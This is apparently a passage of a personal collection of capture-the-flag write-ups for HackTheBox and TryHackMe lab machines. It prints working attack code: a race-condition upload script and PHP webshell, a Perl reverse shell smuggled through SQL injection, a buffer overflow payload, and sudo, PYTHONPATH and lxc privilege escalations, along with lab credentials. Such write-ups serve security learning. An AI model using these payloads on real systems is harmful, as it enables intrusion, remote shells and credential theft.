https://github.com/epi052/feroxbuster/releases/latest\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfc1  Press [ENTER] to use the Scan Management Menu\u2122\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n200      GET       40l       93w     1131c http://siteisup.htb/\n403      GET        9l       28w      277c http://siteisup.htb/.php\n200      GET       40l       93w     1131c http://siteisup.htb/index.php\n301      GET        9l       28w      310c http://siteisup.htb/dev =&gt; http://siteisup.htb/dev/\n200      GET        0l        0w        0c http://siteisup.htb/dev/index.php\n403      GET        9l       28w      277c http://siteisup.htb/server-status\n[####################] - 8m    882184/882184  0s      found:6       errors:4      \n[####################] - 8m    441092/441092  871/s   http://siteisup.htb/ \n[####################] - 8m    441092/441092  871/s   http://siteisup.htb/dev \n</code></pre> <p>The <code>dev</code> directory is returning just and empty response, I also found a dev virtual host but Im getting a 403 error trying to access it:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ gobuster vhost -u http://siteisup.htb -w ~/Wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:          http://siteisup.htb\n[+] Method:       GET\n[+] Threads:      10\n[+] Wordlist:     /home/kali/Wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt\n[+] User Agent:   gobuster/3.1.0\n[+] Timeout:      10s\n===============================================================\n2022/09/25 16:17:19 Starting gobuster in VHOST enumeration mode\n===============================================================\nFound: dev.siteisup.htb (Status: 403) [Size: 281]\n</code></pre> <p>Trying things here and there I found a git repository in the <code>dev</code> directory: <code>http://siteisup.htb/dev/.git</code>. I dumped all the repository (thanks git-dumper) and got access to some source files, looks like an developer admin site thing.</p> <p>According to the commits, looks like this site is hosted in the dev virtual host we found earlier. To bypass the protection we need to add a special header as we can see in the <code>.htaccess</code> file:</p> <pre><code>SetEnvIfNoCase Special-Dev \"only4dev\" Required-Header\nOrder Deny,Allow\nDeny from All\nAllow from env=Required-Header\n</code></pre>"},{"location":"HackTheBox/UpDown/#dev-site-and-rce","title":"Dev site and RCE","text":"<p>Adding the header <code>Special-Dev</code> with the value <code>only4dev</code> allow us to get into the <code>dev.siteisup.htb</code>, I used Burpsuite to make sure my browser requests get the header. Looks like this site includes a functionality to upload a file for checking sites in bulk, obviously it is filtering what we can upload but remember we have the code for it so time to find a bypass!</p> <p>The code reveals that some extentions that could be executed are allowed so the only problem now is to get to the file before it gets deleted. According to the source code, when a file is uploaded, the application takes that file and put it in a directory inside the uploads folder. The directory name is the MD5 hash of the unix timestamp, an example: <code>uploads/MD5(time())/evil.phar</code>. After cheking all the URLs in the file the application deletes it.</p> <p>I noticed that the page hangs if you try to check a non-existent page so adding some fake URLs to the uploaded file should give us some time to get to it. To automate the process of uploading and getting the file I used a Python script (I will show it later) with the <code>threading</code> library to make sure I can execute code while the file POST request is waiting for all my fake URLs to be checked.</p> <p>I tried some extentions to check what I can use to get code execution and <code>.phar</code> did the trick, I noticed something though. Check this payload and the answer:</p> <pre><code>http://www.justheretowintherace.com/\n&lt;?php\n    echo \"Hello World\";\n    echo ini_get(\"disable_functions\");\n?&gt;\n</code></pre> <pre><code>http://www.justheretowintherace.com/\nHello Worldpcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen\n</code></pre> <p>As you can see, there are a lot of blocked functions, including typical functions used to get a webshell. I spent some time reading PHP documentation until I found <code>proc_open</code>, the PHP documentation even included a cool example I used as base to craft this payload:</p> <pre><code>http://www.justheretowintherace.com/\n&lt;?php\n    echo \"Running code...\\n\";\n\n    $command = 'id';\n    if(isset($_GET['cmd'])) {\n        $command = $_GET['cmd'];\n    }\n    $descriptorspec = array(\n       0 =&gt; array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n       1 =&gt; array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n       2 =&gt; array(\"pipe\", \"w\")   // stdout is a pipe that the child will write to\n    );\n    $cwd = '/tmp';\n\n    $process = proc_open($command, $descriptorspec, $pipes, $cwd);\n\n    if (is_resource($process)) {\n        fclose($pipes[0]);\n\n        echo stream_get_contents($pipes[1]);\n        fclose($pipes[1]);\n\n        echo stream_get_contents($pipes[2]);\n        fclose($pipes[2]);\n\n        proc_close($process);\n    }\n?&gt;\n</code></pre> <p>Also, I added some modifications to my Python script to improve it and make sure I could sent custom commands to the uploaded file:</p> <pre><code>import requests, time, hashlib, threading\nfrom urllib.parse import quote\n\n\nurl = 'http://dev.siteisup.htb'\nfile_name = 'rce.phar'\ncommand = 'cat /etc/passwd'\nheaders = { 'Special-Dev' : 'only4dev' }\nfail = False\n\ndef race_for_webshell():\n    command_executed = False\n    while not command_executed  and not fail:\n        predicted_folder_name = hashlib.md5(str(int(time.time())).encode()).hexdigest()\n        response = requests.get(f'{url}/uploads/{predicted_folder_name}/{file_name}?cmd={quote(command)}', headers=headers)\n        if(response.ok):\n            print()\n            print(response.content.decode())\n            command_executed = True\n        else:\n            print(f'Failed {response.status_code}: uploads/{predicted_folder_name}/{file_name}')\n            time.sleep(0.5)\n\nwith open(file_name, 'rb') as file_to_upload:\n    files = { 'file': file_to_upload }\n    data = { 'check': 'Check' }\n\n    print('Uploading Webshell and starting the race...')\n    thread = threading.Thread(target=race_for_webshell)\n    thread.start()\n    response = requests.post(url, files=files, data=data, headers=headers)\n    if 'Extension not allowed!' in response.content.decode():\n        print('Extension not allowed!')\n        fail = True\n    thread.join()\n</code></pre> <p>This is the result of our exploit:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/exploit]\n\u2514\u2500$ python3 exploit.py               \nUploading Webshell and starting the race...\nFailed 404: uploads/47e6ed8a191edae5ec33d6ba6e5e7373/rce.phar\n\nhttp://www.justheretowintherace.com/\nRunning code...\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nsshd:x:109:65534::/run/sshd:/usr/sbin/nologin\nlandscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:111:1::/var/cache/pollinate:/bin/false\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\ndeveloper:x:1002:1002::/home/developer:/bin/bash\n</code></pre> <p>We have RCE!! Getting a reverse shell now is trivial.</p>"},{"location":"HackTheBox/UpDown/#inside-the-machine-as-www-data","title":"Inside the machine as <code>www-data</code>","text":"<p>Once in the machine I started checking things here and there and this called my attention:</p> <pre><code>www-data@updown:/home/developer/dev$ ls -l\ntotal 24\n-rwsr-x--- 1 developer www-data 16928 Jun 22 15:45 siteisup\n-rwxr-x--- 1 developer www-data   154 Jun 22 15:45 siteisup_test.py\n</code></pre> <pre><code>import requests\n\nurl = input(\"Enter URL here:\")\npage = requests.get(url)\nif page.status_code == 200:\n    print \"Website is up\"\nelse:\n    print \"Website is down\"\n</code></pre> <p>The binary is a SUID binary owned by the user <code>developer</code> so if we can control the execution of it we could impersonate that user. Testing both the binary and the Python script looks like the binary was compiled from the Python script (or at least a really similar one).</p> <p>Checking a bit the Python documentation, I found that before checking for installed modules in the typical installation directories, Python will try to check both the current directory and also the <code>PYTHONPATH</code> environment variable trying to find the requested module. We can't write in the directory where this script is located but we can set that environment variable and point it to a directory we control:</p> <pre><code>export PYTHONPATH=/tmp\n</code></pre> <p>Now we create a file called <code>requests.py</code> in the <code>/tmp</code> directory with this content:</p> <pre><code>import pty\n\npty.spawn(\"/bin/sh\")\n</code></pre> <p>Everythinng is ready now, we can execute the binary to start impersonating the <code>developer</code> user!</p> <pre><code>www-data@updown:/tmp$ /home/developer/dev/siteisup\nWelcome to 'siteisup.htb' application\n\n$ id\nuid=1002(developer) gid=33(www-data) groups=33(www-data)\n</code></pre> <p>I will steal the user SSH key and jump to a more stable shell, by the way the user flag is under <code>/home/developer/user.txt</code>.</p>"},{"location":"HackTheBox/UpDown/#pwn-time","title":"Pwn time!","text":"<p>Getting <code>root</code> was pretty easy, the user is allowed to execute <code>easy_install</code> as <code>root</code> without any password:</p> <pre><code>developer@updown:~$ sudo -l\nMatching Defaults entries for developer on localhost:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser developer may run the following commands on localhost:\n    (ALL) NOPASSWD: /usr/local/bin/easy_install\n</code></pre> <p>Gtfobins is your friend:</p> <pre><code>developer@updown:~$ TF=$(mktemp -d)\ndeveloper@updown:~$ echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')\" &gt; $TF/setup.py\ndeveloper@updown:~$ sudo easy_install $TF\nWARNING: The easy_install command is deprecated and will be removed in a future version.\nProcessing tmp.M1s5pktFwH\nWriting /tmp/tmp.M1s5pktFwH/setup.cfg\nRunning setup.py -q bdist_egg --dist-dir /tmp/tmp.M1s5pktFwH/egg-dist-tmp-lsOvGP\n# id\nuid=0(root) gid=0(root) groups=0(root)\n# bash\nroot@updown:/tmp/tmp.M1s5pktFwH#\n</code></pre> <p>The flag is under <code>/root/root.txt</code>.</p>"},{"location":"HackTheBox/Vaccine/","title":"Vaccine","text":""},{"location":"HackTheBox/Vaccine/#nmap-scan","title":"nmap scan","text":"<p>Let's start as always with a <code>nmap</code> scan:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- &lt;MACHINE_IP&gt;\n[sudo] password for kali: \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 15:47 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.053s latency).\nNot shown: 65532 closed ports\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 19.16 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p21,22,80 -sC -sV &lt;MACHINE_IP&gt;\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 15:49 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.052s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)\n|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)\n|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: MegaCorp Login\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 10.15 seconds\n</code></pre> <p>So FTP, SSH and an web server. Let's see that web.</p>"},{"location":"HackTheBox/Vaccine/#port-80","title":"Port 80","text":"<p>A login page, i tried some basic SQL injections payload and some old credentials from previous challenges but no luck. I want to check <code>gobuster</code> to check if we can find something interesting apart from the login form.</p> <pre><code>===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://&lt;MACHINE_IP&gt;\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              php\n[+] Timeout:                 10s\n===============================================================\n2021/09/01 15:58:59 Starting gobuster in directory enumeration mode\n===============================================================\n/index.php            (Status: 200) [Size: 2312]\n/dashboard.php        (Status: 302) [Size: 931] [--&gt; index.php]\n===============================================================\n2021/09/01 16:06:00 Finished\n===============================================================\n</code></pre> <p>A dashboard, but only accesible after login sadly.</p>"},{"location":"HackTheBox/Vaccine/#port-21","title":"Port 21","text":"<p>Looks like in the Oopsie machine we can find the credentials we need under <code>/root/.config/filezilla/filezilla.xml</code>. Using the credentials <code>ftpuser:mc@F1l3ZilL4</code> found in that file we are able to login to the FTP client. </p> <p>In the FTP client we can find a backup file protected with a password that can be cracked using <code>john</code> and Rockyou as the wordlist. The password is <code>741852963</code>.</p> <p>Inside the protected <code>zip</code> file we find an <code>index.php</code> where the admin credentials for the website can be found: <code>admin:2cb42f8734ea607eefed3b70af13bbd3</code>. The password is <code>md5</code> hashed, in this case we can use <code>https://crackstation.net/</code>  to get the plain text password: <code>qwerty789</code>.</p>"},{"location":"HackTheBox/Vaccine/#admin-dashboard","title":"Admin Dashboard","text":"<p>After login to the admin dashboard with the credentials found in the FTP server, we can see a car list. The search field is SQL injectable so let's get some extra information from the database.</p> <pre><code>123'union select '1', '2', '3', version(), '5' -- -\n</code></pre> <p>That code returned: <code>PostgreSQL 11.5 (Ubuntu 11.5-1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.1.0-9ubuntu2) 9.1.0, 64-bit</code></p> <p>After getting that the database is Postgres we can check if we have access to the COPY TO/FROM PROGRAM functionality:</p> <pre><code>123'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';  -- -\n\n123'union select '1', '2', '3', '4', cmd_output from cmd_exec -- -\n</code></pre> <p>After that i was able to get: <code>uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)</code> so we have RCE cool. Let's try to get a shell, after try and error this looks like worked!</p> <pre><code>123'; COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"&lt;MY_IP&gt;:8080\");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;''';  -- -\n</code></pre>"},{"location":"HackTheBox/Vaccine/#in-the-box","title":"In the box","text":"<p>The reverse shell dies after some seconds of inactivity, what is annoying but is what we have right now. In <code>/var/www/html/dashboard.php</code> i found this line: <code>$conn = pg_connect(\"host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!\");</code> and looks like the database password is the same for the system account so we have <code>ssh</code>access now (Thanks god because the reverse shell stability was killing me).</p> <p>Look's like the <code>postgres</code>user can execute <code>vi</code> as <code>root</code>:</p> <pre><code>postgres@vaccine:/var/lib/postgresql/11/main$ sudo -l\nsudo -l\n[sudo] password for postgres: P@s5w0rd!\n\nMatching Defaults entries for postgres on vaccine:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser postgres may run the following commands on vaccine:\n    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf\n</code></pre> <p>Inside <code>vi</code> we can execute commands so once we execute <code>/bin/vi /etc/postgresql/11/main/pg_hba.conf</code> we can just <code>!bash</code> to get a <code>root</code> shell. About the root flag, it is in <code>/root/root.txt</code>.</p>"},{"location":"HackTheBox/You_know_0xDiablos/","title":"You know 0xDiablos","text":"<p>The first thing I did was open the binay with Ghidra:</p> <pre><code>void vuln(void)\n\n{\n  char local_bc [180];\n\n  gets(local_bc);\n  puts(local_bc);\n  return;\n}\n\n\nundefined4 main(void)\n{\n  __gid_t __rgid;\n\n  setvbuf(stdout,(char *)0x0,2,0);\n  __rgid = getegid();\n  setresgid(__rgid,__rgid,__rgid);\n  puts(\"You know who are 0xDiablos: \");\n  vuln();\n  return 0;\n}\n</code></pre> <p>As we can see here, the <code>vuln</code> function is using <code>gets</code>, what is vulnerable to a buffer overflow. We can also find a <code>flag</code> function that will print the flag to us when executed:</p> <pre><code>void flag(int param_1,int param_2)\n\n{\n  char local_50 [64];\n  FILE *local_10;\n\n  local_10 = fopen(\"flag.txt\",\"r\");\n  if (local_10 != (FILE *)0x0) {\n    fgets(local_50,0x40,local_10);\n    if ((param_1 == -0x21524111) &amp;&amp; (param_2 == -0x3f212ff3)) {\n      printf(local_50);\n    }\n    return;\n  }\n  puts(\"Hurry up and try in on server side.\");\n                    /* WARNING: Subroutine does not return */\n  exit(0);\n}\n</code></pre> <p>According to radare the entrypoint for this function is: <code>0x080491e2</code>. Since the binary has no protections regarding ASLR:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/You know 0xDiablos]\n\u2514\u2500$ checksec vuln \n[*] '/home/kali/Desktop/HTB/You know 0xDiablos/vuln'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x8048000)\n    RWX:      Has RWX segments\n</code></pre> <p>We can create a 188 bytes payload (180 bytes for the buffer, 4 bytes for the 8 bytes alligment and 4 bytes for the EBP) followed by the <code>flag</code> function entrypoint address in little endian to overwrite the stack return pointer and make the program execute the <code>flag</code> function. Nice, now for the flag function to print the flag we need to also modify the function parameters:</p> <pre><code>[0xf7f470b0]&gt; pdf @sym.flag\n\u250c 144: sym.flag (int32_t arg_8h, int32_t arg_ch);\n\u2502           ; var int32_t var_4ch @ ebp-0x4c\n\u2502           ; var int32_t var_ch @ ebp-0xc\n\u2502           ; var int32_t var_4h @ ebp-0x4\n\u2502           ; arg int32_t arg_8h @ ebp+0x8\n\u2502           ; arg int32_t arg_ch @ ebp+0xc\n\u2502           0x080491e2      55             push ebp\n\u2502           0x080491e3      89e5           mov ebp, esp\n\u2502           0x080491e5      53             push ebx\n\u2502           0x080491e6      83ec54         sub esp, 0x54\n\u2502           0x080491e9      e832ffffff     call sym.__x86.get_pc_thunk.bx\n\u2502           0x080491ee      81c3122e0000   add ebx, 0x2e12\n\u2502           0x080491f4      83ec08         sub esp, 8\n\u2502           0x080491f7      8d8308e0ffff   lea eax, [ebx - 0x1ff8]\n\u2502           0x080491fd      50             push eax\n\u2502           0x080491fe      8d830ae0ffff   lea eax, [ebx - 0x1ff6]\n\u2502           0x08049204      50             push eax\n\u2502           0x08049205      e8a6feffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)                                                                                                                         \n\u2502           0x0804920a      83c410         add esp, 0x10\n\u2502           0x0804920d      8945f4         mov dword [var_ch], eax\n\u2502           0x08049210      837df400       cmp dword [var_ch], 0\n\u2502       \u250c\u2500&lt; 0x08049214      751c           jne 0x8049232\n\u2502       \u2502   0x08049216      83ec0c         sub esp, 0xc\n\u2502       \u2502   0x08049219      8d8314e0ffff   lea eax, [ebx - 0x1fec]\n\u2502       \u2502   0x0804921f      50             push eax\n\u2502       \u2502   0x08049220      e84bfeffff     call sym.imp.puts           ; int puts(const char *s)\n\u2502       \u2502   0x08049225      83c410         add esp, 0x10\n\u2502       \u2502   0x08049228      83ec0c         sub esp, 0xc\n\u2502       \u2502   0x0804922b      6a00           push 0\n\u2502       \u2502   0x0804922d      e84efeffff     call sym.imp.exit           ; void exit(int status)\n\u2502       \u2514\u2500&gt; 0x08049232      83ec04         sub esp, 4\n\u2502           0x08049235      ff75f4         push dword [var_ch]\n\u2502           0x08049238      6a40           push 0x40                   ; '@' ; 64\n\u2502           0x0804923a      8d45b4         lea eax, [var_4ch]\n\u2502           0x0804923d      50             push eax\n\u2502           0x0804923e      e80dfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)\n\u2502           0x08049243      83c410         add esp, 0x10\n\u2502           0x08049246      817d08efbead.  cmp dword [arg_8h], 0xdeadbeef\n\u2502       \u250c\u2500&lt; 0x0804924d      751a           jne 0x8049269\n\u2502       \u2502   0x0804924f      817d0c0dd0de.  cmp dword [arg_ch], 0xc0ded00d\n\u2502      \u250c\u2500\u2500&lt; 0x08049256      7514           jne 0x804926c\n\u2502      \u2502\u2502   0x08049258      83ec0c         sub esp, 0xc\n\u2502      \u2502\u2502   0x0804925b      8d45b4         lea eax, [var_4ch]\n\u2502      \u2502\u2502   0x0804925e      50             push eax\n\u2502      \u2502\u2502   0x0804925f      e8ccfdffff     call sym.imp.printf         ; int printf(const char *format)\n\u2502      \u2502\u2502   0x08049264      83c410         add esp, 0x10\n\u2502     \u250c\u2500\u2500\u2500&lt; 0x08049267      eb04           jmp 0x804926d\n\u2502     \u2502\u2502\u2514\u2500&gt; 0x08049269      90             nop\n\u2502     \u2502\u2502\u250c\u2500&lt; 0x0804926a      eb01           jmp 0x804926d\n\u2502     \u2502\u2514\u2500\u2500&gt; 0x0804926c      90             nop\n\u2502     \u2502 \u2502   ; CODE XREFS from sym.flag @ 0x8049267, 0x804926a\n\u2502     \u2514\u2500\u2514\u2500&gt; 0x0804926d      8b5dfc         mov ebx, dword [var_4h]\n\u2502           0x08049270      c9             leave\n\u2514           0x08049271      c3             ret\n</code></pre> <p>Adding 4 bytes for the function return pointer (We don't really care) and then the values of the parameters (<code>0xdeadbeef</code> and <code>0xc0ded00d</code>) in hexadecimal and little endian will do:</p> <pre><code>python2 -c \"print(b'A'*188 + b'\\xe2\\x91\\x04\\x08' + b'A'*4 + b'\\xef\\xbe\\xad\\xde' + b'\\x0d\\xd0\\xde\\xc0')\" | nc &lt;MACHINE_IP&gt; &lt;MACHINE_PORT&gt;\n</code></pre>"},{"location":"TryHackMe%21/","title":"TryHackMe!","text":"<p>Cybersecurity training site where you can have access to a lot of challenges. Here you can find all the write ups i have written solving some of those challenges.</p> <p> </p>"},{"location":"TryHackMe%21/AdventOfCyber2/","title":"AdventOfCyber2","text":""},{"location":"TryHackMe%21/AdventOfCyber2/#task-29","title":"Task 29","text":""},{"location":"TryHackMe%21/AdventOfCyber2/#nmap-scan","title":"NMAP scan","text":"<pre><code>Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-24 12:16 EST\nNmap scan report for 10.10.110.96\nHost is up (0.049s latency).\nNot shown: 998 closed ports\nPORT      STATE SERVICE VERSION\n80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n65000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Light Cycle\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 21.94 seconds\n</code></pre>"},{"location":"TryHackMe%21/AdventOfCyber2/#gobuster-scan","title":"Gobuster scan","text":"<pre><code>===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.110.96:65000\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     txt,html,phtml,php\n[+] Timeout:        10s\n===============================================================\n2020/12/24 12:23:15 Starting gobuster\n===============================================================\n/index.php (Status: 200)\n/uploads.php (Status: 200)\n/assets (Status: 301)\n/api (Status: 301)\n/grid (Status: 301)\nProgress: 18271 / 220561 (8.28%)\n===============================================================\n2020/12/24 12:31:18 Finished\n===============================================================\n</code></pre>"},{"location":"TryHackMe%21/AdventOfCyber2/#getting-access","title":"Getting access","text":"<ul> <li>Using burp to block the filter.js file and using the extension <code>.png.php</code> allowed me to upload a reverse shell</li> <li>In the <code>/grid</code> directory all the uploaded files were stored so i got the shell easily</li> </ul>"},{"location":"TryHackMe%21/AdventOfCyber2/#upgrade-and-stabilize-shell","title":"Upgrade and stabilize shell","text":"<pre><code># https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/\n# In the reverse shell\n$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Ctrl-Z\n\n# In our machine\n$ stty raw -echo\n$ fg\n\n# In reverse shell\n# Push Intro/CTRL-C\n$ export TERM=xterm\n</code></pre>"},{"location":"TryHackMe%21/AdventOfCyber2/#webtxt-flag","title":"web.txt flag","text":"<p><code>/var/www/web.txt</code> --&gt; <code>THM{ENTER_THE_GRID}</code></p>"},{"location":"TryHackMe%21/AdventOfCyber2/#local-db-credentials","title":"Local DB credentials","text":"<ul> <li><code>/var/www/TheGrid/includes/dbauth.php</code> --&gt; tron:IFightForTheUsers (DB address: <code>localhost</code>, MSQL DB: tron)</li> </ul>"},{"location":"TryHackMe%21/AdventOfCyber2/#accessing-the-local-db","title":"Accessing the local DB","text":"<p>Use <code>mysql -u tron -p tron</code> and introduce the password IFightForTheUsers</p> <pre><code>mysql&gt; select * from users;\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n|  1 | flynn    | edc621628f6d19a13a00fd683f5e3ff7 |\n+----+----------+----------------------------------+\n</code></pre> <p>Using Crackstation: <code>flynn:@computer@</code></p> <p>Looks like the user used the same password in the machine so <code>su flynn</code> and use the found password to change to the new user</p>"},{"location":"TryHackMe%21/AdventOfCyber2/#usertxt-flag","title":"user.txt flag","text":"<p><code>/home/flynn/user.txt</code> --&gt; <code>THM{IDENTITY_DISC_RECOGNISED}</code></p>"},{"location":"TryHackMe%21/AdventOfCyber2/#scaling-privileges","title":"Scaling privileges","text":"<p><code>flynn</code> user is in the <code>lxd</code> so we can use <code>lxc</code>:</p> <pre><code>flynn@light-cycle:~$ lxc image list\nTo start your first container, try: lxc launch ubuntu:18.04\n\n+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+\n| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |\n+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+\n| Alpine | a569b9af4e85 | no     | alpine v3.12 (20201220_03:48) | x86_64 | 3.07MB | Dec 20, 2020 at 3:51am (UTC) |\n+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+\n</code></pre> <p>We are lucky, we already have an Alpine image in the machine (Very convenient), lets get root access:</p> <p><code>lxc init Alpine pwned -c security.privileged=true</code> <code>lxc config device add pwned system disk source=/ path=/mnt/root recursive=true</code> <code>lxc start pwned</code> <code>lxc exec pwned /bin/sh</code></p> <p>Nice we are in the container, we can access the victim file system in <code>/mnt/root</code> and get the flag:</p> <p><code>/root/root.txt</code> --&gt; <code>THM{FLYNN_LIVES}</code></p> <p>If you want to get access 